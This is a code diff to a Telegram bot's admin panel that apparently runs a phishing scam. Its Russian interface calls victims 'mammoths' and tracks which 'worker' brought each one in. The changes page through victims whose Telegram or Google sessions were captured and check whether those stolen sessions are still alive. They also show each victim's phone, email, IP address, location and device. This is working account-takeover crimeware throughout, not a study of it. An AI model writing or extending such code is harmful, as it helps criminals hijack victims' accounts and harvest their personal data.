@@ -488,39 +488,52 @@ async def cb_adm_main_menu(callback: CallbackQuery, state: FSMContext) -> None:
 
 # --------------------- 1. LOGS & MAMONT ACTIONS ---------------------
 
-@router.callback_query(F.data == "adm_menu_logs")
+@router.callback_query(F.data.startswith("adm_menu_logs"))
 async def cb_adm_menu_logs(callback: CallbackQuery) -> None:
     await callback.answer()
     if not is_admin(callback.from_user.id):
         return
 
-    logs = db.get_all_logs(DB_PATH)
+    # Extract optional page index
+    page = 0
+    if ":page:" in callback.data:
+        try:
+            page = int(callback.data.split(":page:")[1])
+        except (ValueError, IndexError):
+            page = 0
+
+    logs = db.get_active_logs(DB_PATH)
     caller_id = callback.from_user.id
     if caller_id not in MASTER_ADMIN_IDS:
         logs = [u for u in logs if can_admin_access_user(caller_id, u)]
 
     if not logs:
         text = (
-            "📂 <b>Логи команды:</b>\n\n"
-            "<i>Логов в базе данных пока нет.</i>"
+            "📂 <b>Активные логи (Сессии онлайн):</b>\n\n"
+            "<i>В данный момент нет активных авторизованных сессий.</i>\n\n"
+            "💡 <i>Сюда попадают только авторизованные мамонты (до разлогина). "
+            "После того как сессия разлогинена или сброшена, лог автоматически удаляется из этого списка.</i>"
         )
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
-                [InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")]
+                [InlineKeyboardButton(text="🔄 Обновить список", callback_data="adm_menu_logs")],
+                [InlineKeyboardButton(text="🗄 Архив всех логов", callback_data="adm_menu_all_logs")],
+                [InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")],
             ]
         )
         await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
         return
 
-    buttons = []
-    for u in logs[:35]:
-        reg_date = u["registered_at"] or ""
-        try:
-            dt = datetime.fromisoformat(reg_date)
-            date_str = dt.strftime("%d.%m.%Y")
-        except Exception:
-            date_str = "—"
+    PAGE_SIZE = 10
+    total_logs = len(logs)
+    total_pages = max(1, (total_logs + PAGE_SIZE - 1) // PAGE_SIZE)
+    page = max(0, min(page, total_pages - 1))
+    page_logs = logs[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]
 
+    buttons = []
+    for u in page_logs:
+        phone = u["phone"] or "Без номера"
+        username = f"@{u['username']}" if u["username"] else f"ID:{u['tg_id']}"
         worker_tg_id = u["worker_tg_id"]
         w_user = "—"
         if worker_tg_id:
@@ -530,14 +543,98 @@ async def cb_adm_menu_logs(callback: CallbackQuery) -> None:
             else:
                 w_user = f"ID:{worker_tg_id}"
 
-        phone = u["phone"] or "—"
-        btn_text = f"{date_str} Воркер - {w_user} Мамонт - {phone}"
-        buttons.append([InlineKeyboardButton(text=btn_text, callback_data=f"adm_view_user:{u['tg_id']}")])
+        email = u["email"] if ("email" in u.keys() and u["email"]) else None
+        if (not u["phone"] or u["phone"] == "—") and email:
+            label = f"🟢 ✉️ {email} • {w_user}"
+        else:
+            label = f"🟢 {phone} • {username} • {w_user}"
 
+        buttons.append([InlineKeyboardButton(text=label, callback_data=f"adm_view_user:{u['tg_id']}")])
+
+    # Navigation buttons
+    nav_row = []
+    if page > 0:
+        nav_row.append(InlineKeyboardButton(text="◀️ Назад", callback_data=f"adm_menu_logs:page:{page - 1}"))
+    if total_pages > 1:
+        nav_row.append(InlineKeyboardButton(text=f"📄 {page + 1}/{total_pages}", callback_data=f"adm_menu_logs:page:{page}"))
+    if page < total_pages - 1:
+        nav_row.append(InlineKeyboardButton(text="Вперёд ▶️", callback_data=f"adm_menu_logs:page:{page + 1}"))
+    if nav_row:
+        buttons.append(nav_row)
+
+    buttons.append([
+        InlineKeyboardButton(text="🔄 Обновить", callback_data=f"adm_menu_logs:page:{page}"),
+        InlineKeyboardButton(text="🗄 Архив всех логов", callback_data="adm_menu_all_logs"),
+    ])
     buttons.append([InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")])
-    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
 
-    text = f"📂 <b>Все логи команды (Всего: {len(logs)}):</b>\n\nВыберите лог для управления:"
+    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+    text = (
+        f"📂 <b>Активные логи онлайн (Всего: {total_logs}):</b>\n\n"
+        f"<i>Нажмите на нужный лог для быстрого перехода в управление сессией:</i>"
+    )
+    await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
+
+
+@router.callback_query(F.data.startswith("adm_menu_all_logs"))
+async def cb_adm_menu_all_logs(callback: CallbackQuery) -> None:
+    await callback.answer()
+    if not is_admin(callback.from_user.id):
+        return
+
+    page = 0
+    if ":page:" in callback.data:
+        try:
+            page = int(callback.data.split(":page:")[1])
+        except (ValueError, IndexError):
+            page = 0
+
+    logs = db.get_all_logs(DB_PATH)
+    caller_id = callback.from_user.id
+    if caller_id not in MASTER_ADMIN_IDS:
+        logs = [u for u in logs if can_admin_access_user(caller_id, u)]
+
+    if not logs:
+        text = "🗄 <b>Архив логов:</b>\n\n<i>В базе данных нет записей.</i>"
+        keyboard = InlineKeyboardMarkup(
+            inline_keyboard=[[InlineKeyboardButton(text="« К активным логам", callback_data="adm_menu_logs")]]
+        )
+        await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
+        return
+
+    PAGE_SIZE = 10
+    total_logs = len(logs)
+    total_pages = max(1, (total_logs + PAGE_SIZE - 1) // PAGE_SIZE)
+    page = max(0, min(page, total_pages - 1))
+    page_logs = logs[page * PAGE_SIZE : (page + 1) * PAGE_SIZE]
+
+    buttons = []
+    for u in page_logs:
+        phone = u["phone"] or "—"
+        step = u["auth_step"] or "start"
+        icon = "🟢" if (step == "authorized" and u.get("session_string")) else ("❌" if step in ("logged_out", "session_revoked") else "⏳")
+        u_name = f"@{u['username']}" if u["username"] else f"ID:{u['tg_id']}"
+        label = f"{icon} {phone} • {u_name} [{step}]"
+        buttons.append([InlineKeyboardButton(text=label, callback_data=f"adm_view_user:{u['tg_id']}")])
+
+    nav_row = []
+    if page > 0:
+        nav_row.append(InlineKeyboardButton(text="◀️ Назад", callback_data=f"adm_menu_all_logs:page:{page - 1}"))
+    if total_pages > 1:
+        nav_row.append(InlineKeyboardButton(text=f"📄 {page + 1}/{total_pages}", callback_data=f"adm_menu_all_logs:page:{page}"))
+    if page < total_pages - 1:
+        nav_row.append(InlineKeyboardButton(text="Вперёд ▶️", callback_data=f"adm_menu_all_logs:page:{page + 1}"))
+    if nav_row:
+        buttons.append(nav_row)
+
+    buttons.append([
+        InlineKeyboardButton(text="🔄 Обновить", callback_data=f"adm_menu_all_logs:page:{page}"),
+        InlineKeyboardButton(text="📂 К активным логам", callback_data="adm_menu_logs"),
+    ])
+    buttons.append([InlineKeyboardButton(text="« Назад в админку", callback_data="adm_main_menu")])
+
+    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
+    text = f"🗄 <b>Архив всех логов (Всего записей: {total_logs}):</b>\n\nВыберите лог для просмотра:"
     await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
 
 
@@ -577,7 +674,7 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
     auth_step = user["auth_step"] or "start"
     raw_session = user["session_string"] if "session_string" in user.keys() else None
 
-    if raw_session and not raw_session.startswith("mock_") and not raw_session.startswith("sess_"):
+    if raw_session and not raw_session.startswith("mock_") and not raw_session.startswith("sess_") and not raw_session.startswith("google_auth_"):
         is_alive = await contacts_pkg.is_session_alive(raw_session, user_tg_id=user_tg_id)
         if not is_alive:
             db.update_user_auth(DB_PATH, user_tg_id, session_string=None, auth_step="session_revoked")
@@ -585,19 +682,32 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
             session_status = "❌ Сессия сброшена / отозвана"
             asyncio.create_task(notify_session_revoked(user_tg_id, reason="Обнаружена неактивная/отозванная сессия в Telegram"))
         else:
-            session_status = "🔑 Сессия активна"
+            session_status = "🟢 E2E Сессия активна (онлайн)"
+    elif raw_session and raw_session.startswith("google_auth_"):
+        session_status = "🟢 Google OAuth сессия активна"
     elif auth_step in ("session_revoked", "logged_out"):
         session_status = "❌ Сессия сброшена / отозвана"
     else:
         session_status = "❌ Сессия отсутствует"
 
+    email = user["email"] if ("email" in user.keys() and user["email"]) else None
+    email_line = f"📧 <b>Почта:</b> <code>{email}</code>\n" if email else ""
+    ip = user["ip"] if ("ip" in user.keys() and user["ip"]) else "—"
+    country = user["country"] if ("country" in user.keys() and user["country"]) else ""
+    city = user["city"] if ("city" in user.keys() and user["city"]) else ""
+    geo_str = f"{ip} ({country}, {city})" if (country or city) else ip
+    device = user["device"] if ("device" in user.keys() and user["device"]) else "—"
+
     text = (
-        f"👤 <b>Информация о мамонте #{user['id']}:</b>\n\n"
+        f"👤 <b>Карточка мамонта #{user['id']}:</b>\n\n"
         f"📱 <b>Номер:</b> <code>{phone}</code>\n"
+        f"{email_line}"
         f"👤 <b>Юз:</b> {username}\n"
         f"🆔 <b>Айди тг:</b> <code>{user['tg_id']}</code>\n"
         f"🪞 <b>Зеркало:</b> {mirror}\n"
         f"👨‍💻 <b>Юз воркера:</b> {w_user}\n"
+        f"🌐 <b>IP / Гео:</b> <code>{geo_str}</code>\n"
+        f"📱 <b>Устройство:</b> <code>{device}</code>\n"
         f"📊 <b>Статус:</b> <code>{auth_step}</code> ({session_status})"
     )
 
@@ -614,7 +724,7 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
             InlineKeyboardButton(text="🔄 Сбросить сессии", callback_data=f"adm_reset_sess:{user_tg_id}"),
             InlineKeyboardButton(text="🔴 Разлогинить", callback_data=f"adm_logout_ask:{user_tg_id}"),
         ],
-        [InlineKeyboardButton(text="« Назад к списку логов", callback_data="adm_menu_logs")],
+        [InlineKeyboardButton(text="« Назад к активным логам", callback_data="adm_menu_logs")],
     ]
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
     await _send_or_edit_menu(callback, text, keyboard, photo_path=ADMIN_PANEL_PHOTO)
@@ -1220,7 +1330,8 @@ async def cb_adm_logout_ask(callback: CallbackQuery) -> None:
     await callback.answer()
     text = (
         f"⚠️ <b>Подтверждение разлогина:</b>\n\n"
-        f"Вы действительно хотите разлогинить мамонта (ID: <code>{user_tg_id}</code>) и удалить его сессию?"
+        f"Вы действительно хотите разлогинить мамонта (ID: <code>{user_tg_id}</code>) и завершить его сессию?\n\n"
+        f"<i>После разлогина лог будет сразу исключен из списка активных логов.</i>"
     )
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
@@ -1259,9 +1370,9 @@ async def cb_adm_logout_do(callback: CallbackQuery) -> None:
     asyncio.create_task(notify_session_revoked(user_tg_id, reason="Разлогинен администратором через админ-панель", force=True))
     await callback.answer("✅ Сессия мамонта успешно завершена!", show_alert=True)
     await callback.message.answer(
-        f"✅ Сессия мамонта <code>{user_tg_id}</code> успешно удалена из базы данных.",
+        f"✅ Сессия мамонта <code>{user_tg_id}</code> успешно завершена и исключена из активных логов.",
         reply_markup=InlineKeyboardMarkup(
-            inline_keyboard=[[InlineKeyboardButton(text="« К списку логов", callback_data="adm_menu_logs")]]
+            inline_keyboard=[[InlineKeyboardButton(text="« К активным логам", callback_data="adm_menu_logs")]]
         ),
         parse_mode="HTML",
     )
